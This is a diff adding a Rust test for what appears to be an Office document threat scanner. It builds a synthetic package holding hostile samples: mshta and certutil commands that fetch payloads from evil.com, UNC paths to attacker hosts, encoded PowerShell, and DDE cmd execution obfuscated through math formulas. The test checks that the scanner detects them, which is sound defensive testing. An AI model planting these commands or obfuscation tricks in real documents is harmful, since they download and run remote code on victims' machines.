@@ -5600,3 +5600,213 @@ fn e2e_customxml_vbarels_glossary_and_determinant_math_threat_inspection() {
         "JSON missing VBA-CELL-058"
     );
 }
+
+#[test]
+fn e2e_docvars_powerpoint_scenarios_and_complex_math_threat_inspection() {
+    let word_settings = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:docVars>
+    <w:docVar w:name="payload" w:val="powershell -enc AAAA=="/>
+    <w:docVar w:name="unc" w:val="\\evil.attacker.com\share\file"/>
+  </w:docVars>
+</w:settings>"#;
+
+    let word_footnotes = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:footnotes xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:footnote w:id="1">
+    <w:p><w:r><w:t>mshta http://evil.com/payload.hta</w:t></w:r></w:p>
+  </w:footnote>
+</w:footnotes>"#;
+
+    let footnotes_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="\\attacker.evil.com\dropper.exe" TargetMode="External"/>
+</Relationships>"#;
+
+    let ppt_tag = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:tag name="ExecCmd" val="mshta http://evil.com/payload.hta"/>
+</p:tagLst>"#;
+
+    let ppt_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="\\evil-server\share\evil_master.potm" TargetMode="External"/>
+</Relationships>"#;
+
+    let ppt_font = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:fontTable xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
+  <p:embeddedFont>
+    <p:font typeface="\\evil-server\fonts\malicious.ttf"/>
+  </p:embeddedFont>
+</p:fontTable>"#;
+
+    let consolidation_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<consolidation xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <pages>
+    <page source="[\\evil-server\share\data.xlsx]Sheet1!$A$1:$B$10"/>
+  </pages>
+</consolidation>"#;
+
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "DocVarsScenarioProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    // Formulas using COMPLEX, IMREAL, IMAGINARY, SUMXMY2, MULTINOMIAL for de-obfuscation
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1"><f>IF(IMREAL(COMPLEX(65, 0))=65, &quot;cmd|'/c calc'!A1&quot;, &quot;&quot;)</f></c>
+      <c r="B1"><f>CONCAT(IF(IMAGINARY(&quot;10+5i&quot;)=5, &quot;powershell&quot;, &quot;&quot;), IF(SUMXMY2({5}, {2})=9, &quot; -enc&quot;, &quot;&quot;))</f></c>
+      <c r="C1"><f>IF(MULTINOMIAL(1, 2)=3, &quot;certutil -urlcache -split -f http://evil.com/payload.exe&quot;, &quot;&quot;)</f></c>
+    </row>
+  </sheetData>
+  <scenarios>
+    <scenario name="HiddenExploit" comment="test">
+      <inputCells r="D1" val="cmd|'/c calc'!A1"/>
+    </scenario>
+  </scenarios>
+</worksheet>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("word/settings.xml", word_settings.as_bytes()),
+        ("word/footnotes.xml", word_footnotes.as_bytes()),
+        ("word/_rels/footnotes.xml.rels", footnotes_rels.as_bytes()),
+        ("ppt/tags/tag1.xml", ppt_tag.as_bytes()),
+        ("ppt/_rels/presentation.xml.rels", ppt_rels.as_bytes()),
+        ("ppt/fontTable.xml", ppt_font.as_bytes()),
+        ("xl/consolidation.xml", consolidation_xml.as_bytes()),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify Word Document Variables & Notes threats (VBA-CELL-059)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WordDocVariablesOrNotesAnomaly"
+                && (t.coordinate.contains("docVars:shellCommand")
+                    || t.coordinate.contains("docVars:uncPath")
+                    || t.coordinate.contains("notes:shellCommand")
+                    || t.coordinate.contains("notesRels:uncRelationship"))),
+        "Should detect WordDocVariablesOrNotesAnomaly (VBA-CELL-059): {threats:?}"
+    );
+
+    // 2. Verify PowerPoint Tags & Masters threats (VBA-CELL-060)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerPointTagsOrMastersAnomaly"
+                && (t.coordinate.contains("pptTags:shellCommand")
+                    || t.coordinate.contains("pptRels:uncRelationship")
+                    || t.coordinate.contains("pptFont:uncTypeface"))),
+        "Should detect PowerPointTagsOrMastersAnomaly (VBA-CELL-060): {threats:?}"
+    );
+
+    // 3. Verify Scenario Manager & Data Consolidation threats (VBA-CELL-061)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ScenarioManagerOrConsolidationAnomaly"
+                && (t.coordinate.contains("scenario:ddeExecution")
+                    || t.coordinate.contains("consolidation:uncPath"))),
+        "Should detect ScenarioManagerOrConsolidationAnomaly (VBA-CELL-061): {threats:?}"
+    );
+
+    // 4. Verify mathematical formula de-obfuscation in cells
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE"
+                || t.threat_kind == "DDEExecutionFormula"
+                || t.threat_kind == "DeobfuscatedThreat")
+            && t.formula.contains("cmd")),
+        "Cell A1 should resolve DDE cmd execution threat through COMPLEX/IMREAL: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through IMAGINARY/SUMXMY2 evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through MULTINOMIAL evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-059, VBA-CELL-060, VBA-CELL-061
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/docvars_powerpoint_scenarios.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-059"),
+        "SARIF must contain VBA-CELL-059 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-060"),
+        "SARIF must contain VBA-CELL-060 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-061"),
+        "SARIF must contain VBA-CELL-061 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-059, VBA-CELL-060, VBA-CELL-061
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-059\""),
+        "JSON missing VBA-CELL-059"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-060\""),
+        "JSON missing VBA-CELL-060"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-061\""),
+        "JSON missing VBA-CELL-061"
+    );
+}
